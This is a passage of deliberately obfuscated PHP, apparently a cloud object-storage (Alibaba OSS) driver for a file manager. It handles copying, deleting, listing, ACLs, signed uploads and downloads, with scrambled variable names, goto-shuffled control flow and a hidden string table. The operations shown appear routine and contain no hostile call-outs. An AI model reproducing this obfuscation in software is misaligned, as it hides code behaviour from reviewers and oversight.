$this->getPathOuter($f¶Şó‚ùÜà) : !1; } private function multiCopyObject($B†‰ø”«˜ƒ, $BÆ¹óµöóè, $dŠ‘†â†±Í) { $eê´¨±Ù¯’ =& $_SERVER[Šº]; try { goto EàŠ²„§¢Û; EàŠ²„§¢Û: $Dïøñ„¸öç = array(); if ($cãä©†±…í = $this->hashMd5($B†‰ø”«˜ƒ)) { $Dïøñ„¸öç = array(OSS\OssClient::OSS_HEADERS => array($eê´¨±Ù¯’[1264] => $cãä©†±…í)); } $FÙª²ÜÈ²ª = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($BÆ¹óµöóè), $Dïøñ„¸öç); goto ašÊ›Ö’ÇÕ; C¾¬‚’…ŠÙ: $Cóª›æ…¹æ = array(); foreach ($e¨Ú—«ìİ as $AÂÔî¯Â£  => $D•Œ­ÆÓ”ä) { $Cóª›æ…¹æ[] = array($eê´¨±Ù¯’[1268] => $AÂÔî¯Â£  + 1, $eê´¨±Ù¯’[1269] => $D•Œ­ÆÓ”ä); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($BÆ¹óµöóè), $FÙª²ÜÈ²ª, $Cóª›æ…¹æ); goto AŞ¶ïÉã¯À; Bµùà©‚ğ: $cÙª÷ó¾¿‰ = 1024 * 1024 * 10; $Bªø¹õİù = $this->client->generateMultiuploadParts($dŠ‘†â†±Í, $cÙª÷ó¾¿‰); foreach ($Bªø¹õİù as $AÂÔî¯Â£  => $c›’Ò…ö) { $Eºµ‚»ùãÁ = $cöÄ¢°••Í + (int) $c›’Ò…ö[$eê´¨±Ù¯’[1265]]; $E…Ä›ñî« = (int) $c›’Ò…ö[$eê´¨±Ù¯’[334]] + $Eºµ‚»ùãÁ - 1; $dË´Ó£½¦İ = array($eê´¨±Ù¯’[1266] => $Eºµ‚»ùãÁ, $eê´¨±Ù¯’[1267] => $E…Ä›ñî«); $e¨Ú—«ìİ[] = $this->client->uploadPartCopy($this->bucket, $B†‰ø”«˜ƒ, $this->bucket, $this->pathEncode($BÆ¹óµöóè), $f™Ş‰µª, $FÙª²ÜÈ²ª, $dË´Ó£½¦İ); $f™Ş‰µª = $f™Ş‰µª + 1; } goto C¾¬‚’…ŠÙ; ašÊ›Ö’ÇÕ: $f™Ş‰µª = 1; $cöÄ¢°••Í = 0; $e¨Ú—«ìİ = array(); goto Bµùà©‚ğ; AŞ¶ïÉã¯À: } catch (OSS\Core\OssException $fÄ †¬Ï´Š) { return !1; } return !0; } public function moveFile($dÓñ‰‘‡ë, $D‡ˆµ¢èÉ) { if ($this->copyFile($dÓñ‰‘‡ë, $D‡ˆµ¢èÉ)) { $this->remove($dÓñ‰‘‡ë); return $this->getPathOuter($D‡ˆµ¢èÉ); } return !1; } public function delFile($ešŸåÂ¢ƒ±) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ešŸåÂ¢ƒ±)); } catch (OSS\Core\OssException $d©ÛÂÒ¾½) { return !1; } return !0; } public function delFolder($E´‘Í÷µ° ) { goto dÒ¯ëŠÈƒ¾; cÌ³ßºñ…: if (!empty($E´‘Í÷µ° ) && !in_array($BÇ¨íÜ£, $Dºõš…’è [$AÜª¥‚™Ñö[75]])) { $Dºõš…’è [$AÜª¥‚™Ñö[75]][] = $BÇ¨íÜ£; } $CÒóåñ–î• = $this->delByBatch($Dºõš…’è [$AÜª¥‚™Ñö[74]]); if (!$CÒóåñ–î•) { return !1; } goto a¯†‰˜˜¡¥; DÙ£©ÛŠ†: $Dºõš…’è  = $this->fileList($E´‘Í÷µ° ); $this->listItemCache = !0; $BÇ¨íÜ£ = trim($E´‘Í÷µ° , $AÜª¥‚™Ñö[8]) . $AÜª¥‚™Ñö[8]; goto cÌ³ßºñ…; a¯†‰˜˜¡¥: return $this->delByBatch($Dºõš…’è [$AÜª¥‚™Ñö[75]]); goto Cäª§Ğª”Ş; dÒ¯ëŠÈƒ¾: $AÜª¥‚™Ñö =& $_SERVER[Šº]; if (!$this->exist($E´‘Í÷µ° )) { return !0; } $this->listItemCache = !1; goto DÙ£©ÛŠ†; Cäª§Ğª”Ş: } private function delByBatch($cÑ§†­ãè¾) { foreach (array_chunk($cÑ§†­ãè¾, 1000) as $a„…á„´¬è) { try { $this->client->deleteObjects($this->bucket, $a„…á„´¬è); } catch (OSS\Core\OssException $E¦¥¼ƒ–¦õ) { return !1; } } return !0; } public function rename($A‘²Ç‡Êïå, $Dø¾ô‡¯¹•) { return $this->renameObject($A‘²Ç‡Êïå, $Dø¾ô‡¯¹•); } private function fileInfo($BÊÙ¨Âñè, $C†ÙåÜ«®Ñ = false, $eÅÛÀ÷æÁ = array()) { goto eÒ¬šíÊ¸; eÒ¬šíÊ¸: $dßøÎ‘×ñº =& $_SERVER[Šº]; $c¢«Õ«â÷ø = array($dßøÎ‘×ñº[28] => $this->pathThis($BÊÙ¨Âñè), $dßøÎ‘×ñº[76] => $this->getPathOuter($BÊÙ¨Âñè), $dßøÎ‘×ñº[29] => $dßøÎ‘×ñº[192], $dßøÎ‘×ñº[78] => isset($eÅÛÀ÷æÁ[$dßøÎ‘×ñº[78]]) ? $eÅÛÀ÷æÁ[$dßøÎ‘×ñº[78]] : 0, $dßøÎ‘×ñº[168] => $this->ext($BÊÙ¨Âñè)); if ($C†ÙåÜ«®Ñ) { return $c¢«Õ«â÷ø; } goto a¯‚¯Õëå”; B´Ôø•ëÈ: return $c¢«Õ«â÷ø; goto fßÚÂùêÖ›; fŠöá°ÚÌ±: if (isset($eÅÛÀ÷æÁ[$dßøÎ‘×ñº[78]])) { $c¢«Õ«â÷ø[$dßøÎ‘×ñº[78]] = $eÅÛÀ÷æÁ[$dßøÎ‘×ñº[78]]; } if (isset($eÅÛÀ÷æÁ[$dßøÎ‘×ñº[84]])) { $c¢«Õ«â÷ø[$dßøÎ‘×ñº[84]] = $eÅÛÀ÷æÁ[$dßøÎ‘×ñº[84]]; } if (isset($eÅÛÀ÷æÁ[$dßøÎ‘×ñº[196]]) && !trim($c¢«Õ«â÷ø[$dßøÎ‘×ñº[84]])) { $c¢«Õ«â÷ø[$dßøÎ‘×ñº[84]] = $eÅÛÀ÷æÁ[$dßøÎ‘×ñº[196]]; } goto B´Ôø•ëÈ; a¯‚¯Õëå”: $c¢«Õ«â÷ø[$dßøÎ‘×ñº[193]] = $c¢«Õ«â÷ø[$dßøÎ‘×ñº[84]] = 0; $c¢«Õ«â÷ø[$dßøÎ‘×ñº[194]] = $c¢«Õ«â÷ø[$dßøÎ‘×ñº[195]] = !0; if (empty($eÅÛÀ÷æÁ)) { $D‡”…ÜÈƒ½ = $this->objectMeta($BÊÙ¨Âñè); if (!$D‡”…ÜÈƒ½) { return $c¢«Õ«â÷ø; } $eÅÛÀ÷æÁ = array($dßøÎ‘×ñº[84] => strtotime($D‡”…ÜÈƒ½[$dßøÎ‘×ñº[1263]]), $dßøÎ‘×ñº[78] => $D‡”…ÜÈƒ½[$dßøÎ‘×ñº[1262]] + 0); } goto fŠöá°ÚÌ±; fßÚÂùêÖ›: } private function folderInfo($cÁâÎéâóÂ, $F„Ş¼ = false, $cÂ‚ÊæùäÉ = array()) { goto e‚¸á›¯Œó; c¸îŸÊ: if (isset($cÂ‚ÊæùäÉ[$cÏ²³ø†ïÓ[84]])) { $aŠ¤œê£˜[$cÏ²³ø†ïÓ[84]] = $cÂ‚ÊæùäÉ[$cÏ²³ø†ïÓ[84]]; } if (isset($cÂ‚ÊæùäÉ[$cÏ²³ø†ïÓ[193]])) { $aŠ¤œê£˜[$cÏ²³ø†ïÓ[193]] = $cÂ‚ÊæùäÉ[$cÏ²³ø†ïÓ[193]]; } return $aŠ¤œê£˜; goto bë°‚¡“™Ã; Cï‡¾êĞÏÚ: $aŠ¤œê£˜[$cÏ²³ø†ïÓ[193]] = $aŠ¤œê£˜[$cÏ²³ø†ïÓ[84]] = 0; $aŠ¤œê£˜[$cÏ²³ø†ïÓ[194]] = $aŠ¤œê£˜[$cÏ²³ø†ïÓ[195]] = !0; if (empty($cÂ‚ÊæùäÉ)) { $cÁâÎéâóÂ = rtrim($cÁâÎéâóÂ, $cÏ²³ø†ïÓ[8]) . $cÏ²³ø†ïÓ[8]; $b¼à÷ó—“Š = $this->objectMeta($cÁâÎéâóÂ); if (!$b¼à÷ó—“Š) { return $aŠ¤œê£˜; } $cÂ‚ÊæùäÉ = array($cÏ²³ø†ïÓ[193] => $b¼à÷ó—“Š[$cÏ²³ø†ïÓ[1270]][$cÏ²³ø†ïÓ[1271]], $cÏ²³ø†ïÓ[84] => strtotime($b¼à÷ó—“Š[$cÏ²³ø†ïÓ[1263]])); } goto c¸îŸÊ; e‚¸á›¯Œó: $cÏ²³ø†ïÓ =& $_SERVER[Šº]; $aŠ¤œê£˜ = array($cÏ²³ø†ïÓ[28] => $this->pathThis($cÁâÎéâóÂ), $cÏ²³ø†ïÓ[76] => $this->getPathOuter($cÏ²³ø†ïÓ[8] . $cÁâÎéâóÂ), $cÏ²³ø†ïÓ[29] => $cÏ²³ø†ïÓ[77]); if ($F„Ş¼) { return $aŠ¤œê£˜; } goto Cï‡¾êĞÏÚ; bë°‚¡“™Ã: } public function listPath($Aƒ°İŒ…¦, $a¡ß‚ˆÂø = false) { $FŸˆˆò =& $_SERVER[Šº]; $cÈ«‚•÷ØÈ = $this->fileList($Aƒ°İŒ…¦, $FŸˆˆò[8], !0); foreach ($cÈ«‚•÷ØÈ[$FŸˆˆò[75]] as $d»¿ó¤İÅ¯ => $A’ª…Óç§) { $cÈ«‚•÷ØÈ[$FŸˆˆò[75]][$d»¿ó¤İÅ¯] = $this->folderInfo($A’ª…Óç§, $a¡ß‚ˆÂø, $A’ª…Óç§); } foreach ($cÈ«‚•÷ØÈ[$FŸˆˆò[74]] as $d»¿ó¤İÅ¯ => $A’ª…Óç§) { $cÈ«‚•÷ØÈ[$FŸˆˆò[74]][$d»¿ó¤İÅ¯] = $this->fileInfo($A’ª…Óç§[$FŸˆˆò[28]], $a¡ß‚ˆÂø, $A’ª…Óç§); } return $cÈ«‚•÷ØÈ; } public function has($A¢‘—¤µ¢›, $dîÙïïµ³ = false, $c²Š„„ï‰† = true) { goto fòÉÆöŒĞ; fòÉÆöŒĞ: $Fò¡«è Ú =& $_SERVER[Šº]; $A¢‘—¤µ¢› = trim($A¢‘—¤µ¢›, $Fò¡«è Ú[8]); $eÈ•ƒŞñ¡ = empty($A¢‘—¤µ¢›) ? $Fò¡«è Ú[33] : $A¢‘—¤µ¢› . $Fò¡«è Ú[8]; goto A¯ë‘ˆÅ‡ô; fŠèöøŒÏƒ: while (!0) { check_abort(); $BÇ¿±£«‘Î = array($Fò¡«è Ú[1258] => $Fò¡«è Ú[8], $Fò¡«è Ú[1259] => $eÈ•ƒŞñ¡, $Fò¡«è Ú[1260] => $CƒˆŒÛÀÑ, $Fò¡«è Ú[1261] => $D¡ŸæøÁ­ğ); try { $A¬³‡²‘ï¥ = $this->client->listObjects($this->bucket, $BÇ¿±£«‘Î); } catch (OSS\Core\OssException $D¬œ²½‚—‚) { break; } $D¡ŸæøÁ­ğ = $A¬³‡²‘ï¥->getNextMarker(); $A¢‚Ÿ¬ğ¹Ú = $A¬³‡²‘ï¥->getObjectList(); $B†ŸªÎù¯ï = $A¬³‡²‘ï¥->getPrefixList(); if ($dîÙïïµ³) { if (count($A¢‚Ÿ¬ğ¹Ú) > 1 || count($A¢‚Ÿ¬ğ¹Ú) == 1 && $A¢‚Ÿ¬ğ¹Ú[0]->getKey() != $eÈ•ƒŞñ¡) { $b³Ò½à ñ• += count($A¢‚Ÿ¬ğ¹Ú) - 1; } if (!empty($B†ŸªÎù¯ï)) { $eáâºØô‚ += count($B†ŸªÎù¯ï); } if ($D¡ŸæøÁ­ğ === $Fò¡«è Ú[33]) { break; } continue; } if ($c²Š„„ï‰†) { if (!empty($A¢‚Ÿ¬ğ¹Ú)) { if (count($A¢‚Ÿ¬ğ¹Ú) > 1 || $A¢‚Ÿ¬ğ¹Ú[0]->getKey() != $eÈ•ƒŞñ¡) { return !0; } } } else { if (!empty($B†ŸªÎù¯ï)) { return !0; } } if ($D¡ŸæøÁ­ğ === $Fò¡«è Ú[33]) { break; } } if ($dîÙïïµ³) { return array($Fò¡«è Ú[202] => $b³Ò½à ñ•, $Fò¡«è Ú[203] => $eáâºØô‚); } return !1; goto e¨×ëù«›Ñ; A¯ë‘ˆÅ‡ô: $D¡ŸæøÁ­ğ = $Fò¡«è Ú[33]; $CƒˆŒÛÀÑ = 500; $b³Ò½à ñ• = $eáâºØô‚ = 0; goto fŠèöøŒÏƒ; e¨×ëù«›Ñ: } public function listAll($Aæ³¥ÈÅœá) { $d´ÃĞ›×­œ =& $_SERVER[Šº]; $E‚Œ¯‚¢Ÿ = $this->fileList($Aæ³¥ÈÅœá, $d´ÃĞ›×­œ[33], !0); $aœÀôâ‘ï = array(); foreach ($E‚Œ¯‚¢Ÿ[$d´ÃĞ›×­œ[74]] as $f‚Š’°ßóË) { $aœÀôâ‘ï[$f‚Š’°ßóË[$d´ÃĞ›×­œ[28]]] = $f‚Š’°ßóË[$d´ÃĞ›×­œ[78]]; } foreach ($E‚Œ¯‚¢Ÿ[$d´ÃĞ›×­œ[75]] as $f‚Š’°ßóË) { if (is_string($f‚Š’°ßóË)) { $aœÀôâ‘ï[$f‚Š’°ßóË] = 0; } } return $this->listAllFiles($Aæ³¥ÈÅœá, array_keys($aœÀôâ‘ï), $aœÀôâ‘ï); } public function canRead($e÷òÏƒ°) { $Cêõ”Ÿäí =& $_SERVER[Šº]; $EÙÇæ°ØÖÉ = $this->pathAcl($e÷òÏƒ°); return $EÙÇæ°ØÖÉ == $Cêõ”Ÿäí[1272] || $EÙÇæ°ØÖÉ == $Cêõ”Ÿäí[527] ? !0 : !1; } public function canWrite($fÒ¢•Œç¢) { $D¡šŸÚ¼¤ª = $this->pathAcl($fÒ¢•Œç¢); return $D¡šŸÚ¼¤ª == $_SERVER[Šº][527] ? !0 : !1; } public function pathAcl($AÂíÜÙ—õ) { goto CØ–Ù©è—«; CØ–Ù©è—«: $F±Ÿ’˜Ôø² =& $_SERVER[Šº]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $EÅÜáÒªô = $this->client->getObjectAcl($this->bucket, $this->pathEncode($AÂíÜÙ—õ)); } catch (OSS\Core\OssException $AèÍè½Üæ) { return !1; } goto c÷‚­è’éõ; c÷‚­è’éõ: $A¢áÇö£îÈ = $EÅÜáÒªô == $F±Ÿ’˜Ôø²[34] ? $this->bucketAcl : $EÅÜáÒªô; if ($A¢áÇö£îÈ == $F±Ÿ’˜Ôø²[1273]) { return $F±Ÿ’˜Ôø²[1272]; } if ($A¢áÇö£îÈ == $F±Ÿ’˜Ôø²[1274]) { return $F±Ÿ’˜Ôø²[527]; } goto aĞÑŸîùæ¨; aĞÑŸîùæ¨: return $A¢áÇö£îÈ; goto c•±õäƒñ; c•±õäƒñ: } private function chmodPath($aÂŒÃ‚İ¢õ, $d”îâè­Üî = '') { $A‘™è†Üñ‹ =& $_SERVER[Šº]; $C¸¸¶Á‡Á¾ = empty($d”îâè­Üî) ? $A‘™è†Üñ‹[1274] : $d”îâè­Üî; $Dï‘ÒÏ×Œò = array($A‘™è†Üñ‹[34], $A‘™è†Üñ‹[191], $A‘™è†Üñ‹[1273], $A‘™è†Üñ‹[1274]); if (!in_array($C¸¸¶Á‡Á¾, $Dï‘ÒÏ×Œò)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($aÂŒÃ‚İ¢õ), $C¸¸¶Á‡Á¾); } catch (OSS\Core\OssException $a–êÜó²ä§) { return !1; } return !0; } public function getContent($f¡ùºÆÖÆ) { return $this->fileSubstr($f¡ùºÆÖÆ, -1); } public function setContent($Eƒ†Îõï’, $aÜÊá‡£ğ = '') { $aòÚßŠ­ =& $_SERVER[Šº]; try { $eŠãëêÒ“ = $this->trafficLimit($aòÚßŠ­[1275]); $d»¯ˆíÀ‚Ò = $this->client->putObject($this->bucket, $this->pathEncode($Eƒ†Îõï’), $aÜÊá‡£ğ, $eŠãëêÒ“); } catch (OSS\Core\OssException $eëë©ãÖèÈ) { return !1; } $D’ƒ‰ÜÉ•ğ = array($aòÚßŠ­[1264] => trim($d»¯ˆíÀ‚Ò[$aòÚßŠ­[1276]], $aòÚßŠ­[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Eƒ†Îõï’))); $this->updateObjMeta($Eƒ†Îõï’, $D’ƒ‰ÜÉ•ğ); return isset($d»¯ˆíÀ‚Ò[$aòÚßŠ­[1277]][$aòÚßŠ­[1222]]) ? !0 : !1; } private function updateObjMeta($BˆÙ–ò¢èŸ, $e†¯¤³†ñ˜) { $BˆÙ–ò¢èŸ = $this->pathEncode($BˆÙ–ò¢èŸ); try { $eÙ Ğ¥÷Ä´ = array(OSS\OssClient::OSS_HEADERS => $e†¯¤³†ñ˜); $this->client->copyObject($this->bucket, $BˆÙ–ò¢èŸ, $this->bucket, $BˆÙ–ò¢èŸ, $eÙ Ğ¥÷Ä´); } catch (OSS\Core\OssException $F•‚Ã‘¯‹Õ) { return !1; } return !0; } public function upload($b‚…’à…‰, $dßº”ÀÑ›», $cÆÎ¨Àİ = false, $EõÅÓâÅ¡¢ = REPEAT_REPLACE) { $b¬ôâÜ‹†š =& $_SERVER[Šº]; $C‰Ãì…‹öë = trim($b‚…’à…‰, $b¬ôâÜ‹†š[8]); $e†ÄÙ«Ìí¶ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($b¬ôâÜ‹†š[1264] => @md5_file($dßº”ÀÑ›»)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($b‚…’à…‰))); $e†ÄÙ«Ìí¶ = $this->trafficLimit($b¬ôâÜ‹†š[1275], $e†ÄÙ«Ìí¶); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($C‰Ãì…‹öë), $dßº”ÀÑ›», $e†ÄÙ«Ìí¶); } catch (OSS\Core\OssException $d¼ôä­Ã˜Ğ) { return !1; } return $this->getPathOuter($b‚…’à…‰); } public function getHost() { $fí½®«ÁÏ‹ =& $_SERVER[Šº]; $EÂ¢„†è° = explode($fí½®«ÁÏ‹[177], parent::getHost()); return $EÂ¢„†è°[0] . $fí½®«ÁÏ‹[177] . $this->bucket . $fí½®«ÁÏ‹[95] . $EÂ¢„†è°[1]; } public function uploadFormData($dˆƒóùÂŠ«, $e¬ŸÒ†²±Ò = 3600) { goto fÚ……Ë¤‘ö; e”Â‰ˆÎ: return $A¥öà¨ÆÌµ; goto d×¤…·‘÷ò; fÚ……Ë¤‘ö: $BÚò”øß¥È =& $_SERVER[Šº]; if (!($D²†‰½Æ£ = $this->getHost())) { return !1; } $c¦Ôòƒ†‰­ = $e¬ŸÒ†²±Ò; goto aİë†âˆè¿; D×îÉìã‡£: $Dò³‚£õŒ = base64_encode(hash_hmac($BÚò”øß¥È[229], $a»‘¥™à, $this->secret, !0)); $A¥öà¨ÆÌµ = array($BÚò”øß¥È[1187] => $a»‘¥™à, $BÚò”øß¥È[1281] => $this->accessKey, $BÚò”øß¥È[1183] => $BÚò”øß¥È[1175], $BÚò”øß¥È[1282] => $Dò³‚£õŒ, $BÚò”øß¥È[175] => $D²†‰½Æ£); $A¥öà¨ÆÌµ = $this->trafficLimit($BÚò”øß¥È[1275], $A¥öà¨ÆÌµ); goto e”Â‰ˆÎ; dÀ¬Ä¤À‘: $C©½ß’Ü¯ = strpos($DÈ‹îæ«ø, $BÚò”øß¥È[293]); $DÈ‹îæ«ø = substr($DÈ‹îæ«ø, 0, $C©½ß’Ü¯) . $BÚò”øß¥È[1279]; $Cƒƒ‚éÌö¨ = 1048576000 * 5; goto c©Å¯ñãßÉ; c©Å¯ñãßÉ: $Bƒ˜Œ¨Š™Æ = $this->pathFather($dˆƒóùÂŠ«); $aøƒ¢£ = array($BÚò”øß¥È[1177] => $DÈ‹îæ«ø, $BÚò”øß¥È[1178] => array(array($BÚò”øß¥È[1280], 0, $Cƒƒ‚éÌö¨), array($BÚò”øß¥È[1181], $BÚò”øß¥È[1182], $Bƒ˜Œ¨Š™Æ))); $a»‘¥™à = base64_encode(json_encode($aøƒ¢£)); goto D×îÉìã‡£; aİë†âˆè¿: $DæÈôÇÄºâ = date($BÚò”øß¥È[1278], time() + $c¦Ôòƒ†‰­); $f’³Ê»Ùæ = new DateTime($DæÈôÇÄºâ); $DÈ‹îæ«ø = $f’³Ê»Ùæ->format(DateTime::ISO8601); goto dÀ¬Ä¤À‘; d×¤…·‘÷ò: } public function multiUploadFormData($AñÙ„–‚Ú†, $eŸŠ÷ªÕÎ = 3600) { $a§ßËõò¶¶ =& $_SERVER[Šº]; if (!($Cô†Ûİ¾Üä = $this->getHost())) { return !1; } $FĞŞ´è¬® = $this->trafficLimit($a§ßËõò¶¶[1275]); $eÀ£ÆÙİªÈ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($AñÙ„–‚Ú†), $FĞŞ´è¬®); return array($a§ßËõò¶¶[220] => $eÀ£ÆÙİªÈ, $a§ßËõò¶¶[175] => $Cô†Ûİ¾Üä . $a§ßËõò¶¶[8] . $this->pathEncode($AñÙ„–‚Ú†), $a§ßËõò¶¶[221] => gmdate($a§ßËõò¶¶[1283]), $a§ßËõò¶¶[93] => $AñÙ„–‚Ú†); } public function multiUploadAuthData($fóÖùÈäª¹, $CÄ¦¥¼ÏìÓ = array()) { goto D‚÷¬°áŠ’; f¬¢ê¬…ğ–: $C¬²Ó¤áÄ = array($Eá¹ºñÊ±´[223], $Eá¹ºñÊ±´[33], $Eá¹ºñÊ±´[119], $Déã“×¶, "\170\55\x6f\163\163\x2d\x64\141\x74\145\x3a{$Déã“×¶}", $Eá¹ºñÊ±´[8] . $this->bucket . $Eá¹ºñÊ±´[8] . $eï‰»¥™‰„ . $c×Üå„ÏÌ¥); if (strpos($c×Üå„ÏÌ¥, $Eá¹ºñÊ±´[224]) === 0) { $C¬²Ó¤áÄ[0] = $Eá¹ºñÊ±´[225]; if ($cÏµÕÇ¦Ç¸ = $this->trafficLimit($Eá¹ºñÊ±´[1275])) { $eï‰»¥™‰„ = $Eá¹ºñÊ±´[1284]; array_splice($C¬²Ó¤áÄ, 5, 0, $eï‰»¥™‰„ . $Eá¹ºñÊ±´[4] . $cÏµÕÇ¦Ç¸[$eï‰»¥™‰„]); } } if (isset($CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[226]]) && $CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[226]] == $Eá¹ºñÊ±´[227]) { $C¬²Ó¤áÄ[0] = $Eá¹ºñÊ±´[227]; } goto f´Œš‰é÷ò; b“Øåí“¸Æ: $D†É±Ó¦·Ü = $Eá¹ºñÊ±´[1248] . $this->accessKey . $Eá¹ºñÊ±´[4] . $E¤÷¿öÅÁƒ; if (strpos($c×Üå„ÏÌ¥, $Eá¹ºñÊ±´[224]) === 0) { $D†É±Ó¦·Ü = array($Eá¹ºñÊ±´[231] => $D†É±Ó¦·Ü, $Eá¹ºñÊ±´[221] => $Déã“×¶); if ($cÏµÕÇ¦Ç¸) { $D†É±Ó¦·Ü = array_merge($D†É±Ó¦·Ü, $cÏµÕÇ¦Ç¸); } } return $D†É±Ó¦·Ü; goto D¦ªç—†Éé; D‚÷¬°áŠ’: $Eá¹ºñÊ±´ =& $_SERVER[Šº]; $Déã“×¶ = isset($CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[221]]) ? $CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[221]] : gmdate($Eá¹ºñÊ±´[1283]); $c×Üå„ÏÌ¥ = isset($CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[168]]) ? $CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[168]] : $Eá¹ºñÊ±´[33]; goto A¸«¹´âçœ; A¸«¹´âçœ: $eï‰»¥™‰„ = $fóÖùÈäª¹; if (isset($CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[93]])) { $eï‰»¥™‰„ = $CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[93]]; unset($CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[93]]); } if (isset($CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[222]])) { $CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[221]] = $Déã“×¶; return $this->listUploadParts($eï‰»¥™‰„, $CÄ¦¥¼ÏìÓ); } goto f¬¢ê¬…ğ–; f´Œš‰é÷ò: if (!empty($CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[1285]])) { $f±˜‚®±“Å = array_merge(array($C¬²Ó¤áÄ[4]), $CÄ¦¥¼ÏìÓ[$Eá¹ºñÊ±´[1285]]); sort($f±˜‚®±“Å); $C¬²Ó¤áÄ[4] = implode($Eá¹ºñÊ±´[228], $f±˜‚®±“Å); } $eÒùÀºÔÌª = implode($Eá¹ºñÊ±´[228], $C¬²Ó¤áÄ); $E¤÷¿öÅÁƒ = base64_encode(hash_hmac($Eá¹ºñÊ±´[229], $eÒùÀºÔÌª, $this->secret, !0)); goto b“Øåí“¸Æ; D¦ªç—†Éé: } public function listUploadParts($A———¾ç, $EÁ­ğ„ÒŸÎ) { goto C¦‹³µ¯‡ ; fã¾¬¦Áİ: return array($FğÄ‰Í™½œ[231] => $Aã†Š™Ì¦Õ, $FğÄ‰Í™½œ[221] => $EÁ­ğ„ÒŸÎ[$FğÄ‰Í™½œ[221]], $FğÄ‰Í™½œ[233] => $aÊ“ê¢øô); goto f‚ÅÖùß¤ô; aõ‘Øï™¯Æ: unset($EÁ­ğ„ÒŸÎ[$FğÄ‰Í™½œ[222]], $EÁ­ğ„ÒŸÎ[$FğÄ‰Í™½œ[226]]); $Aã†Š™Ì¦Õ = $this->multiUploadAuthData($A———¾ç, $EÁ­ğ„ÒŸÎ); if (empty($Aã†Š™Ì¦Õ)) { return !1; } goto fã¾¬¦Áİ; C¦«²¥­ÍÛ: $DÛ’ÓĞ¾À£ = $e¯§Ä¦–·ø->getListPart(); $aÊ“ê¢øô = array(); foreach ($DÛ’ÓĞ¾À£ as $bËŠŒ»¢÷Ó) { $aÊ“ê¢øô[] = array($FğÄ‰Í™½œ[1268] => $bËŠŒ»¢÷Ó->getPartNumber(), $FğÄ‰Í™½œ[1269] => trim($bËŠŒ»¢÷Ó->getETag(), $FğÄ‰Í™½œ[116])); } goto aõ‘Øï™¯Æ; C¦‹³µ¯‡ : $FğÄ‰Í™½œ =& $_SERVER[Šº]; $D–—ÕÄØó = parse_url_query($EÁ­ğ„ÒŸÎ[$FğÄ‰Í™½œ[168]]); $e¯§Ä¦–·ø = $this->client->listParts($this->bucket, $this->pathEncode($A———¾ç), $D–—ÕÄØó[$FğÄ‰Í™½œ[220]]); goto C¦«²¥­ÍÛ; f‚ÅÖùß¤ô: } public function download($fÙñµª…, $f†‚³ìÊ¸) { if ($this->isFolder($fÙñµª…)) { return !1; } try { $B¬ÂõÔİÀ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $f†‚³ìÊ¸); $B¬ÂõÔİÀ = $this->trafficLimit($_SERVER[Šº][109], $B¬ÂõÔİÀ); $this->client->getObject($this->bucket, $this->pathEncode($fÙñµª…), $B¬ÂõÔİÀ); } catch (OSS\Core\OssException $d›º§‹Ì‹) { return !1; } return $f†‚³ìÊ¸; } public function fileSubstr($dßïĞ™›ø, $A¶’ù¯¥à„ = 0, $a¦¶ÜÖÎÂ = false) { if ($A¶’ù¯¥à„ === -1) { $B”„î­¥¬ª = array(); } else { if ($a¦¶ÜÖÎÂ === !1) { $b‰«®èÊ‘ê = $this->size($dßïĞ™›ø); } else { $b‰«®èÊ‘ê = $A¶’ù¯¥à„ + $a¦¶ÜÖÎÂ - 1; } $B”„î­¥¬ª = array(OSS\OssClient::OSS_RANGE => "{$A¶’ù¯¥à„}\x2d{$b‰«®èÊ‘ê}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($dßïĞ™›ø), $B”„î­¥¬ª); } catch (OSS\Core\OssException $DÀçÀëŒó) { think_exception($DÀçÀëŒó->getMessage()); return !1; } } private function trafficLimit($bÎâßà†¶´, $EóæŸ†ÄÑ¨ = array()) { goto fçŒ¡ç¨; fçŒ¡ç¨: $c«¯¿‡Íë… =& $_SERVER[Šº]; if ($bÎâßà†¶´ == $c«¯¿‡Íë…[1275] && $this->isUploadServer() || $bÎâßà†¶´ == $c«¯¿‡Íë…[109] && $this->isFileOutServer()) { return $EóæŸ†ÄÑ¨; } $bœ¤™Â›Íœ = floatval($GLOBALS[$c«¯¿‡Íë…[6]][$c«¯¿‡Íë…[88]][$c«¯¿‡Íë…[107]][$bÎâßà†¶´]) * 1024 * 1024 * 8; goto aâ¢“éøòÃ; aâ¢“éøòÃ: if (!$bœ¤™Â›Íœ) { return $EóæŸ†ÄÑ¨; } $bœ¤™Â›Íœ = $bœ¤™Â›Íœ < 819200 ? 819200 : ($bœ¤™Â›Íœ > 838860800 ? 838860800 : $bœ¤™Â›Íœ); $EóæŸ†ÄÑ¨[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($bœ¤™Â›Íœ); goto cØŸÊˆ¿èº; cØŸÊˆ¿èº: return $EóæŸ†ÄÑ¨; goto F¬Š©ÊÄÚ; F¬Š©ÊÄÚ: } public function link($aÌÁ¾±Íˆœ, $CÄ¹‡Ã½í = array()) { $C¼â¸ëšµ– =& $_SERVER[Šº]; if (!$this->exist($aÌÁ¾±Íˆœ) || 